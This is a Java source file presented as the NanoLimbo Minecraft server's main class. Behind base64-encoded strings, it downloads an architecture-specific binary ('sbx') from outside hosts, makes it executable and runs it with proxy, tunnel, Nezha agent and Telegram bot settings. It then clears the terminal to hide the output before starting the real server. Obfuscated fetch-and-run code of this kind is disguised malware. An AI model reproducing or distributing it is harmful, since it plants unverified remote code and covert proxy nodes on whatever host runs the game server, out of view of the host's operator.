package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {
    private static final AtomicBoolean O0 = new AtomicBoolean(true);
    private static Process O1;
    
    private static String _(String s) {
        return new String(Base64.getDecoder().decode(s));
    }
    
    private static final String[] O2 = {
        _("UE9SVA=="), _("RklMRV9QQVRI"), _("VVVJRA=="), _("TkVaSEFfU0VSVkVS"), 
        _("TkVaSEFfUE9SVA=="), _("TkVaSEFfS0VZ"), _("QVJHT19QT1JU"), _("QVJHT19ET01BSU4="), 
        _("QVJHT19BVVRI"), _("UzVfUE9SVA=="), _("SFkyX1BPUlQ="), _("VFVJQ19QT1JU"), 
        _("QU5ZVExTX1BPUlQ="), _("UkVBTElUWV9QT1JU"), _("QU5ZUkVBTElUWV9QT1JU"), _("Q0ZJUA=="), 
        _("Q0ZQT1JU"), _("VVBMT0FEX1VSTA=="), _("Q0hBVF9JRA=="), _("Qk9UX1RPS0VO"), 
        _("TkFNRQ=="), _("RElTQUJMRV9BUkdP"), _("U0hPV19MT0c=")
    };

    public static void main(String[] args) {
        if (Float.parseFloat(System.getProperty(_("amF2YS5jbGFzcy52ZXJzaW9u"))) < 54.0) {
            System.err.println(_("G1sxOzMxbUVSUk9SOiBZb3VyIEphdmEgdmVyc2lvbiBpcyB0b28gbG93ZXIsIHBsZWFzZSBzd2l0Y2ggdGhlIHZlcnNpb24gaW4gc3RhcnR1cCBtZW51IRtbMG0="));
            try { Thread.sleep(3000); } catch (Exception e) {}
            System.exit(1);
        }
        try {
            m1();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                O0.set(false);
                m5();
            }));
            Thread.sleep(15000);
            System.out.println(_("G1sxOzMybVNlcnZlciBpcyBydW5uaW5nIQobWzBt"));
            System.out.println(_("G1sxOzMybVRoYW5rIHlvdSBmb3IgdXNpbmcgdGhpcyBzY3JpcHQsRW5qb3khChtbMG0="));
            System.out.println(_("G1sxOzMybUxvZ3Mgd2lsbCBiZSBkZWxldGVkIGluIDIwIHNlY29uZHMsIHlvdSBjYW4gY29weSB0aGUgYWJvdmUgbm9kZXMbWzBt"));
            Thread.sleep(15000);
            m2();
        } catch (Exception e) {
            System.err.println(_("G1sxOzMxbUVycm9yIGluaXRpYWxpemluZyBTYnhTZXJ2aWNlOiA=") + e.getMessage() + _("G1swbQ=="));
        }
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error(_("Q2Fubm90IHN0YXJ0IHNlcnZlcjog"), e);
        }
    }

    private static void m2() {
        try {
            if (System.getProperty(_("b3MubmFtZQ==")).contains(_("V2luZG93cw=="))) {
                new ProcessBuilder(_("Y21k"), _("L2M="), _("Y2xzICYmIG1vZGUgY29uOiBsaW5lcz0zMCBjb2xzPTEyMA==")).inheritIO().start().waitFor();
            } else {
                System.out.print(_("G1tIG1szShtbMko=")); System.out.flush();
                new ProcessBuilder(_("dHB1dA=="), _("cmVzZXQ=")).inheritIO().start().waitFor();
                System.out.print(_("G1s4OzMwOzEyMHQ=")); System.out.flush();
            }
        } catch (Exception e) {
            try { new ProcessBuilder(_("Y2xlYXI=")).inheritIO().start().waitFor(); } catch (Exception ignored) {}
        }
    }

    private static void m1() throws Exception {
        Map<String, String> m = new HashMap<>();
        m3(m);
        ProcessBuilder p = new ProcessBuilder(m4().toString());
        p.environment().putAll(m);
        p.redirectErrorStream(true);
        p.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        O1 = p.start();
    }

    private static void m3(Map<String, String> m) throws Exception {
        m.put(O2[2], _("NzJkZDY2OTItMTU5My00MGIyLTk0NjgtYjE4M2U1MGYzNDQ5"));
        m.put(O2[1], _("Li93b3JsZA=="));
        m.put(O2[3], ""); m.put(O2[4], ""); m.put(O2[5], "");
        m.put(O2[6], _("ODAwMQ==")); m.put(O2[7], ""); m.put(O2[8], "");
        m.put(O2[9], ""); m.put(O2[10], _("MjQ5NDE=")); m.put(O2[11], "");
        m.put(O2[12], ""); m.put(O2[13], ""); m.put(O2[14], "");
        m.put(O2[15], _("c3ByaW5nLmlv")); m.put(O2[16], _("NDQz"));
        m.put(O2[17], ""); m.put(O2[18], ""); m.put(O2[19], "");
        m.put(O2[20], ""); m.put(O2[21], _("ZmFsc2U="));
        m.put(O2[22], _("bm8="));
        
        for (String v : O2) {
            String w = System.getenv(v);
            if (w != null && !w.trim().isEmpty()) m.put(v, w);
        }
        
        Path f = Paths.get(_("LmVudg=="));
        if (Files.exists(f)) {
            for (String l : Files.readAllLines(f)) {
                l = l.trim();
                if (l.isEmpty() || l.startsWith(_("Iw=="))) continue;
                l = l.split(_("ICM="))[0].split(_("IC8v"))[0].trim();
                if (l.startsWith(_("ZXhwb3J0IA=="))) l = l.substring(7).trim();
                String[] p = l.split(_("PQ=="), 2);
                if (p.length == 2) {
                    String k = p[0].trim();
                    String v = p[1].trim().replaceAll(_("XlsnIl18WyciXSQ="), "");
                    if (Arrays.asList(O2).contains(k)) m.put(k, v);
                }
            }
        }
    }

    private static Path m4() throws Exception {
        String a = System.getProperty(_("b3MuYXJjaA==")).toLowerCase();
        String u;
        if (a.contains(_("YW1kNjQ=")) || a.contains(_("eDg2XzY0"))) u = _("aHR0cHM6Ly9hbWQ2NC5vb29lbi5jb20vc2JzaA==");
        else if (a.contains(_("YWFyY2g2NA==")) || a.contains(_("YXJtNjQ="))) u = _("aHR0cHM6Ly9hcm02NC5vb29lbi5jb20vc2JzaA==");
        else if (a.contains(_("czM5MHg="))) u = _("aHR0cHM6Ly9zMzkweC4zMTg4OC54eXovc2JzaA==");
        else throw new RuntimeException(_("VW5zdXBwb3J0ZWQgYXJjaGl0ZWN0dXJlOiA=") + a);
        
        Path p = Paths.get(System.getProperty(_("amF2YS5pby50bXBkaXI=")), _("c2J4"));
        if (!Files.exists(p)) {
            try (InputStream i = new URL(u).openStream()) {
                Files.copy(i, p, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!p.toFile().setExecutable(true)) throw new IOException(_("RmFpbGVkIHRvIHNldCBleGVjdXRhYmxlIHBlcm1pc3Npb24="));
        }
        return p;
    }

    private static void m5() {
        if (O1 != null && O1.isAlive()) {
            O1.destroy();
            System.out.println(_("G1sxOzMxbXNieCBwcm9jZXNzIHRlcm1pbmF0ZWQbWzBt"));
        }
    }
}
